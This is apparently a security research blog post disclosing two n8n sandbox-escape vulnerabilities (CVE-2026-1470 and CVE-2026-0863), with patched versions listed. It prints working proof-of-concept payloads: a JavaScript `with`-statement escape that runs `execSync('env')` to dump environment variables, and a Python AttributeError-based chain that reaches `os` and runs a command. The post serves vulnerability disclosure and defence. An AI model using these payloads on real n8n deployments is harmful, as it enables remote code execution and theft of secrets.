    <script>window.__INITIAL_STATE__={"data":{"realTimePost":{"description":"Nathan Nehorai, JFrog Security Researcher","title":"Achieving Remote Code Execution on n8n Via Sandbox Escape - CVE-2026-1470 & CVE-2026-0863","date":"January 27, 2026","type":"realTimePost","tag":"Real Time Post","img":"\u002Fimg\u002FRealTimePostImage\u002Fpost_thumbnail1.png","path":"\u002Fpost\u002Fachieving-remote-code-execution-on-n8n-via-sandbox-escape\u002F","content":"\u003Cp\u003E\u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Fn8n-rce\u002Fimage1.png\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe JFrog Security Research team recently discovered and disclosed two vulnerabilities in n8n’s sandbox mechanism: CVE-2026-1470, rated 9.9 Critical, impacting the expression evaluation engine, and CVE-2026-0863, rated 8.5 High, affecting Python execution in the Code node (“Internal” mode).\u003Cbr\u003E\n\u003Ca href=\"https:\u002F\u002Fgithub.com\u002Fn8n-io\u002Fn8n\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003En8n\u003C\u002Fa\u003E is a popular AI workflow automation platform that combines AI capabilities with business process automation. \u003C\u002Fp\u003E\n\u003Cp\u003EFollowing earlier vulnerability disclosures, n8n strengthened its JavaScript sandbox and, for the Python Code node, introduced a new “task-runner” option along with additional sandbox hardening measures. Despite these improvements, our research team was able to bypass these protections, demonstrating that even robust sandboxing mechanisms can be circumvented.\u003C\u002Fp\u003E\n\u003Cp\u003EIn both cases, exploitation resulted in remote code execution (RCE) by abusing gaps in the AST sanitization logic. Attackers that are able to create n8n workflows can exploit these vulnerabilities and easily achieve full remote code execution on the host running the n8n service. The vulnerabilities were applicable on n8n’s cloud platform and are still applicable on any self-hosted deployment of n8n which is running an unpatched version.\u003C\u002Fp\u003E\n\u003Ch2 id=\"who-is-vulnerable-to-cve-2026-1470--cve-2026-0863\"\u003E\u003Ca href=\"#who-is-vulnerable-to-cve-2026-1470--cve-2026-0863\" aria-hidden=\"true\" tabindex=\"-1\"\u003EWho is vulnerable to CVE-2026-1470 &#x26; CVE-2026-0863?\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003ECVE-2026-1470 - n8n users should upgrade to version 1.123.17, 2.4.5 or 2.5.1. Any earlier version is susceptible to CVE-2026-1470.\u003C\u002Fp\u003E\n\u003Cp\u003ECVE-2026-0863 - n8n users should upgrade to version 1.123.14, 2.3.5, or 2.4.2. Any  earlier version is susceptible to CVE-2026-0863.\u003C\u002Fp\u003E\n\u003Ch2 id=\"cve-2026-1470---executing-javascript-inside-the-expression-engine\"\u003E\u003Ca href=\"#cve-2026-1470---executing-javascript-inside-the-expression-engine\" aria-hidden=\"true\" tabindex=\"-1\"\u003ECVE-2026-1470 - Executing JavaScript Inside the Expression Engine\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003E\u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Fn8n-rce\u002Fimage2.png\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EAs described in the \u003Ca href=\"https:\u002F\u002Fdocs.n8n.io\u002Fcode\u002Fexpressions\u002F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003Eofficial n8n documentation\u003C\u002Fa\u003E, an expression is: \u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Fn8n-rce\u002Fimage3.png\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003ESo, how does this actually work? How come attackers can’t just execute arbitrary commands in the n8n host?\u003C\u002Fp\u003E\n\u003Cp\u003EWhen the expression engine encounters a \u003Ccode\u003E{{ }}\u003C\u002Fcode\u003E block, it processes the enclosed content by passing it to a JavaScript \u003Ccode\u003EFunction\u003C\u002Fcode\u003E constructor, which then executes the supplied code.\u003C\u002Fp\u003E\n\u003Cp\u003EBecause this execution model is inherently dangerous, n8n relies on an AST-based sandbox to validate that the JavaScript input is safe and cannot trigger unintended behavior, such as running arbitrary OS commands.\u003C\u002Fp\u003E\n\u003Cp\u003EAt the core of this sandboxing mechanism is \u003Ca href=\"https:\u002F\u002Fgithub.com\u002Fn8n-io\u002Ftournament\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003En8n’s Tournament library\u003C\u002Fa\u003E. The library parses the input into an Abstract Syntax Tree (AST) and hooks potentially dangerous nodes to neutralize them before execution.\u003C\u002Fp\u003E\n\u003Cp\u003EThe sanitization process begins by populating the execution environment with a modified global object:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-ts\"\u003E\u002F\u002Fpackages\u002Fworkflow\u002Fsrc\u002Fexpression.ts\ndata.process = typeof process !== 'undefined'\n    ? {\n        arch: process.arch,\n        env: process.env.N8N_BLOCK_ENV_ACCESS_IN_NODE !== 'false' ? {} : process.env,\n        platform: process.platform,\n        pid: process.pid,\n        ppid: process.ppid,\n        release: process.release,\n        version: process.pid,\n        versions: process.versions,\n    }\n: {};\n\nExpression.initializeGlobalContext(data); \u002F\u002F&#x3C;== This method will define most of the dangerous global objects, setters, getters, etc. into undefined or empty objects as can be seen here \n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EFollowed by a static regex-based check to catch \u003Ccode\u003E.constructor\u003C\u002Fcode\u003E occurrences:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-ts\"\u003E\u002F\u002Fpackages\u002Fworkflow\u002Fsrc\u002Fexpression.ts\nconst constructorValidation = new RegExp(\u002F\\.\\s*constructor\u002Fgm);\n        if (parameterValue.match(constructorValidation)) {\n            throw new ExpressionError('Expression contains invalid constructor function call', {\n                causeDetailed: 'Constructor override attempt is not allowed due to security concerns',\n                runIndex,\n                itemIndex,\n            });\n        }\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EFinally, the expression is passed through the Tournament hook validators. If all checks complete without errors, the expression is executed.\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-ts\"\u003E\u002F\u002Fpackages\u002Fworkflow\u002Fsrc\u002Fexpression-evaluator-proxy.ts\nconst errorHandler: ErrorHandler = () =\u003E {};\nconst tournamentEvaluator = new Tournament(errorHandler, undefined, undefined, {\n    before: [ThisSanitizer],\n    after: [PrototypeSanitizer, DollarSignValidator],\n});\nconst evaluator: Evaluator = tournamentEvaluator.execute.bind(tournamentEvaluator);\nexport const setErrorHandler = (handler: ErrorHandler) =\u003E {\n    tournamentEvaluator.errorHandler = handler;\n};\nexport const evaluateExpression: Evaluator = (expr, data) =\u003E {\n    return evaluator(expr, data);\n};\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EDuring the Tournament evaluation process, three hooks are applied: \u003Ccode\u003EThisSanitizer\u003C\u002Fcode\u003E, \u003Ccode\u003EPrototypeSanitizer\u003C\u002Fcode\u003E, and \u003Ccode\u003EDollarSignValidator\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EThe \u003Ccode\u003EThisSanitizer\u003C\u002Fcode\u003E, as the name suggests, mitigates attempts to escape via \u003Ccode\u003Ethis\u003C\u002Fcode\u003E by rewriting function invocations to use \u003Ccode\u003E.call()\u003C\u002Fcode\u003E or \u003Ccode\u003E.bind()\u003C\u002Fcode\u003E, binding execution to a sterilized global object:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-ts\"\u003Efunction() { return this.process; })() =\u003E transforms into =\u003E .call({ process: {} }, ...args)\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThis prevents access to the real global context through \u003Ccode\u003Ethis\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EThe \u003Ccode\u003EPrototypeSanitizer\u003C\u002Fcode\u003E blocks prototype chain manipulation by denying access to properties such as \u003Ccode\u003E\\_\\_proto\\_\\_\u003C\u002Fcode\u003E, \u003Ccode\u003Eprototype\u003C\u002Fcode\u003E, \u003Ccode\u003Econstructor\u003C\u002Fcode\u003E, \u003Ccode\u003EgetPrototypeOf\u003C\u002Fcode\u003E, and others commonly abused in sandbox escapes.\u003C\u002Fp\u003E\n\u003Cp\u003EFinally, the \u003Ccode\u003EDollarSignValidator\u003C\u002Fcode\u003E restricts the use of the \u003Ccode\u003E$\u003C\u002Fcode\u003E identifier, which is reserved as the workflow data accessor.\u003C\u002Fp\u003E\n\u003Cp\u003EIn short, several validation layers are in place to mitigate well-known JavaScript sandbox escape vectors, including prototype pollution, global context access, reflection APIs, and constructor abuse.\u003C\u002Fp\u003E\n\u003Cp\u003EHowever, one particularly problematic JavaScript feature was overlooked: the \u003Ccode\u003Ewith\u003C\u002Fcode\u003E statement.\u003C\u002Fp\u003E\n\u003Cp\u003EThis may have been ignored due to its deprecated status and the fact that it is strongly discouraged, as described \u003Ca href=\"https:\u002F\u002Fdeveloper.mozilla.org\u002Fen-US\u002Fdocs\u002FWeb\u002FJavaScript\u002FReference\u002FStatements\u002Fwith\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003Ehere\u003C\u002Fa\u003E:  \u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Fn8n-rce\u002Fimage4.png\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E“\u003Cem\u003EMay be the source of confusing bugs\u003C\u002Fem\u003E”?\u003Cbr\u003E\nThat sounds like exactly what we are looking for. Conveniently for us, the \u003Ccode\u003Ewith\u003C\u002Fcode\u003E statement is still supported by the Tournament AST parser.\u003C\u002Fp\u003E\n\u003Cp\u003EThe \u003Ccode\u003Ewith\u003C\u002Fcode\u003E statement effectively defines the scope for an expression, as described in the documentation:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-ts\"\u003Ewith (Math) {\n  a = PI * r * r;\n  x = r * cos(PI);\n  y = r * sin(PI \u002F 2);\n}\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThere is no need to explicitly reference \u003Ccode\u003EMath\u003C\u002Fcode\u003E when calling \u003Ccode\u003EPI\u003C\u002Fcode\u003E, \u003Ccode\u003Ecos\u003C\u002Fcode\u003E, or \u003Ccode\u003Esin\u003C\u002Fcode\u003E. The \u003Ccode\u003Ewith\u003C\u002Fcode\u003E statement defines the \u003Ccode\u003EMath\u003C\u002Fcode\u003E object as the scope for all expressions inside the block.\u003C\u002Fp\u003E\n\u003Cp\u003ESo how can this be abused to bypass the sandbox restrictions?\u003C\u002Fp\u003E\n\u003Cp\u003EThe current implementation blocks access to\u003Ccode\u003Econstructor\u003C\u002Fcode\u003E when it appears as a \u003Ccode\u003EMemberExpression\u003C\u002Fcode\u003E node:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-ts\"\u003Eobj.constructor                                                                                                                                                    \nobj[\"constructor\"]\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EHowever, when \u003Ccode\u003Econstructor\u003C\u002Fcode\u003E is used as a standalone identifier, it is not blocked by either the AST validation or the static regex check, which only looks for \u003Ccode\u003E.constructor\u003C\u002Fcode\u003E:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-ts\"\u003Evar constructor = 'gotcha';\n\u002F\u002F {{ (function(){ var constructor = 'gotcha'; })() }} &#x3C;= won't be blocked\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThis allows us to trick the AST checks by introducing a decoy \u003Ccode\u003Econstructor\u003C\u002Fcode\u003E identifier inside a \u003Ccode\u003Ewith\u003C\u002Fcode\u003E statement and scoping it to \u003Ccode\u003Efunction (){}\u003C\u002Fcode\u003E, which effectively resolves to the \u003Ccode\u003EFunction\u003C\u002Fcode\u003E object:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-ts\"\u003E{{ (function(){ var constructor = 'gotcha'; with(function(){}){ return constructor(\"return 1337\")() } })() }}\n\u002F\u002Fconsole: 1337\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThis expression is not blocked because, from the AST’s perspective, \u003Ccode\u003Econstructor\u003C\u002Fcode\u003E is treated as a simple identifier. We can confirm this behavior by observing what happens when the decoy is removed:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-ts\"\u003E{{ (function(){ var not_a_constructor = 'gotcha'; with(function(){}){ return constructor(\"return 1337\")() } })() }}\n\u002F\u002Fconsole: Cannot access \"constructor\" due to security concerns\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EIn other words, the AST believes \u003Ccode\u003Econstructor\u003C\u002Fcode\u003E is a harmless identifier, while in reality it resolves to \u003Ccode\u003EFunction.prototype.constructor\u003C\u002Fcode\u003E (where \u003Ccode\u003EFunction.prototype.constructor \\=== Function\u003C\u002Fcode\u003E). From that point, achieving arbitrary code execution becomes straightforward:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-ts\"\u003E{{ (function(){ var constructor = 'gotcha'; with(function(){}){ return constructor(\"return process.mainModule.require('child_process').execSync('env').toString().trim()\")() } })() }}\n\u002F\u002Fconsole: the main node's environment variables\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThis vulnerability received a critical rating, since the arbitrary code execution occurs in n8n’s main node, allowing authenticated attackers to completely take over an n8n instance.\u003C\u002Fp\u003E\n\u003Ch2 id=\"cve-2026-0863---erroring-our-way-out\"\u003E\u003Ca href=\"#cve-2026-0863---erroring-our-way-out\" aria-hidden=\"true\" tabindex=\"-1\"\u003ECVE-2026-0863 - Erroring Our Way Out\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThe Python Code Node allows n8n users to execute arbitrary Python code for processing purposes, however - this code is also subjected to an AST sandbox, in order to protect the n8n instance from complete takeover while running under “Internal” configuration.  \u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Fn8n-rce\u002Fimage5.png\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Fn8n-rce\u002Fimage6.png\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThis node can be executed under two different configurations. When the n8n instance is running in the recommended \"External\" configuration, Python execution takes place inside a separate Docker sidecar container rather than the main node. In this setup, an attacker would need an additional exploit to escape the sidecar and impact the underlying host.\u003C\u002Fp\u003E\n\u003Cp\u003EHowever, if the n8n instance is running in the \"Internal\" configuration, Python code is executed as a subprocess on the main node itself, allowing a successful exploit to compromise the entire n8n instance.\u003C\u002Fp\u003E\n\u003Cp\u003EIn both configurations, Python code is executed under a restrictive AST-based sandbox defined by the \u003Ccode\u003ESecurityConfig\u003C\u002Fcode\u003E object. In its default configuration, the sandbox forbids importing both \u003Ccode\u003Estdlib\u003C\u002Fcode\u003E and all other external modules and denies access to a wide range of built-in functions, as shown below:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-py\"\u003E# packages\u002F@n8n\u002Ftask-runner-python\u002Fsrc\u002Fconstants.py\nBUILTINS_DENY_DEFAULT = \"eval,exec,compile,open,input,breakpoint,getattr,object,type,vars,setattr,delattr,hasattr,dir,memoryview,__build_class__,globals,locals,license,help,credits,copyright\"\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EUser-supplied code is transformed into an AST, and each node is evaluated against the \u003Ccode\u003ESecurityConfig\u003C\u002Fcode\u003E policy, along with custom checks for dangerous node types such as \u003Ccode\u003EImport\u003C\u002Fcode\u003E, \u003Ccode\u003ECall\u003C\u002Fcode\u003E, and \u003Ccode\u003EAttribute\u003C\u002Fcode\u003E. The full implementation can be found \u003Ca href=\"https:\u002F\u002Fgithub.com\u002Fn8n-io\u002Fn8n\u002Fblob\u002Fn8n%402.4.0\u002Fpackages\u002F%40n8n\u002Ftask-runner-python\u002Fsrc\u002Ftask_analyzer.py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003Ehere\u003C\u002Fa\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EAt first glance, the default \u003Ccode\u003ESecurityConfig\u003C\u002Fcode\u003E appears extremely restrictive, leaving little room for meaningful interaction. Additionally, a modified global object is injected in place of the standard one:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-css\"\u003E# packages\u002F@n8n\u002Ftask-runner-python\u002Fsrc\u002Ftask_executor.py\n\nglobals = {\n\"__builtins__\": TaskExecutor._filter_builtins(security_config),\n\"_items\": items,\n\"_query\": query,\n\"print\": TaskExecutor._create_custom_print(print_args),\n}\nexec(compiled_code, globals)\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EA common case with static AST-based sandboxes, Python’s formatting features can be leveraged to partially bypass restrictions and inspect internal objects, including the active \u003Ccode\u003ESecurityConfig\u003C\u002Fcode\u003E instance:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-py\"\u003Edef gen_obj():\n   yield 1\n\ng = gen_obj()\nnext(g)\n\ntrick_ast='gi_frame.f_builtins[__import__].__closure__[1].cell_contents'\nfmt = '{0.' + trick_ast + '}'\nconfig = fmt.format(g)\n\nreturn [{\"json\": {\"config\": config}}]\n\n##this will leak the \"SecurityConfig\" object: #SecurityConfig(stdlib_allow=set(), external_allow=set(), builtins_deny={'__build_class__', 'hasattr', 'locals', 'input', 'type', 'open', 'credits', 'globals', 'compile', 'delattr', 'getattr', 'dir', 'object', 'license', 'vars', 'exec', 'memoryview', 'setattr', 'eval', 'help', 'breakpoint', 'copyright'}, runner_env_deny=True)\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EWhile this leakage is undesirable, \u003Ccode\u003Eformat()\u003C\u002Fcode\u003E alone only provides a string representation of objects and does not allow direct invocation. Normally, this limitation could be bypassed using \u003Ccode\u003Egetattr\u003C\u002Fcode\u003E, but as shown above, \u003Ccode\u003Egetattr\u003C\u002Fcode\u003E is explicitly forbidden by the policy.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003EOne of the fundamental weaknesses of AST-based sandboxes is their sensitivity to language evolution.\u003C\u002Fstrong\u003E High-level languages like Python frequently introduce subtle changes that can invalidate sandbox assumptions. Starting with Python 3.10, \u003Ca href=\"https:\u002F\u002Fdocs.python.org\u002F3\u002Flibrary\u002Fexceptions.html#AttributeError\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003EAttributeError exceptions gained the name and obj attributes\u003C\u002Fa\u003E. This means that when we encounter an \u003Ccode\u003EAttributeError\u003C\u002Fcode\u003E exception we can call the object that was accessed for the named attribute!\u003C\u002Fp\u003E\n\u003Cp\u003EFor demonstration purposes:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-py\"\u003Edef new_getattr(obj, attribute, *, Exception):\n    try:\n        f'{{0.{attribute}.ribbit}}'.format(obj)\n    except Exception as e:\n        return e.obj\n        \nclass FrogSay():\n     secret = \"ribbit\"\n\nobj = FrogSay()\nprint(new_getattr(obj, \"secret\",Exception=Exception))\n# this will print \"ribbit\" to console\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EBy combining formatting-based access with \u003Ccode\u003Ee.obj\u003C\u002Fcode\u003E, we can bridge the gap between a string-only representation and a fully callable object, without triggering the AST checks.\u003C\u002Fp\u003E\n\u003Cp\u003EUsing this technique, we can construct a complete RCE chain that escapes the sandbox entirely:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-py\"\u003Edef new_getattr(obj, attribute, *, Exception):\n    try:\n        f'{{0.{attribute}.ribbit}}'.format(obj)\n    except Exception as e:\n        return e.obj\n\ntry:\n    raise ValueError(\"pwn\")\nexcept Exception as e:\n    tb = new_getattr(e, '__traceback__', Exception=Exception)\n    frame = new_getattr(tb, 'tb_frame', Exception=Exception)\n    builtins = new_getattr(frame, 'f_builtins', Exception=Exception)\n    us = chr(95)\n    imprt = builtins[us+us+'import'+us+us]\n    import_globals = new_getattr(imprt, '__globals__', Exception=Exception)\n\n    os = import_globals['os']\n    os.uname()\n\n# Will execute the uname system command\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch2 id=\"conclusions\"\u003E\u003Ca href=\"#conclusions\" aria-hidden=\"true\" tabindex=\"-1\"\u003EConclusions\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThese vulnerabilities highlight how difficult it is to safely sandbox dynamic, high‑level languages such as JavaScript and Python. Even with multiple validation layers, deny lists, and AST‑based controls in place, subtle language features and runtime behaviors can be leveraged to bypass security assumptions.\u003C\u002Fp\u003E\n\u003Cp\u003EIn this case, deprecated or rarely used constructs, combined with interpreter changes and exception handling behavior, were enough to break out of otherwise restrictive sandboxes and achieve remote code execution. This reinforces the need for continuous reassessment of sandbox designs, careful alignment with specific runtime versions, and strong defense‑in‑depth strategies when executing untrusted code.\u003C\u002Fp\u003E\n\u003Cp\u003EFor platforms like n8n, which are frequently deployed in sensitive environments and handle privileged workflows, these issues underscore the importance of minimizing execution privileges and avoiding reliance on static validation alone.  \u003C\u002Fp\u003E\n","excerpt":"Our research team discovered and disclosed two vulnerabilities in n8n’s sandbox mechanism leading to remote code execution.","minutes":"9","schema":"","canonical":""}},"context":{}};(function(){var s;(s=document.currentScript||document.scripts[document.scripts.length-1]).parentNode.removeChild(s);}());</script><script src="/assets/js/app.bf37fef3.js" defer></script><script src="/assets/js/page--src--templates--real-time-post-vue.d8806c3f.js" defer></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8" data-body="true">
    if (window.airgap) {
      const cookieSettings = document.getElementById('cookie_settings') || document.querySelector('.ot-sdk-show-settings');
      cookieSettings.href = "#";
      cookieSettings.target = "_self";
      cookieSettings.onclick = () => {
        transcend.showConsentManager({ viewState: 'CompleteOptions' });
      };
    }
  </script>
  </body>
</html>
